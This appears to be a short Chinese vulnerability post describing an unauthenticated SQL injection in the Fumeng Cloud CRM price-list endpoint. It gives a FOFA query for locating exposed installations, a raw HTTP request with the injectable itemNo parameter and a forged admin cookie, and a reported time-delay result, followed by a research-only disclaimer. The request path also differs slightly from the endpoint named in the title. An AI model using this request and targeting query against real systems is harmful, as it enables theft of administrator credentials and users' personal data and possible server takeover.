#  孚盟云CRM BusinessPriceListList.aspx SQL注入漏洞  
 0day收割机   2026-05-03 09:48  
  
# 漏洞简介  
  
上海孚盟  
软件  
有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云BusinessPriceListList.aspx接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
# 影响版本  
# fofa语法  
> app="孚盟软件-孚盟云"  
  
# 漏洞复现  
```
GET /m/Dingding/Product/BusinessPriceList.aspx?itemNo='SQLI_POC-- HTTP/1.1
Host:
Cookie: UserCookie={"empId":"admin","corpId": "1"}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWBCFVqrDZEb2m4LpI7v72Boicp15WPRu4gkWY10EjBI2WEUElDvxUg340aqiaG4mbDqvicnmAOa6Q0ft6Ey3pKVdsQ6tnud7rrnuY/640?wx_fmt=png&from=appmsg "")  
  
成功延时 4 秒  
  
仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。  
  
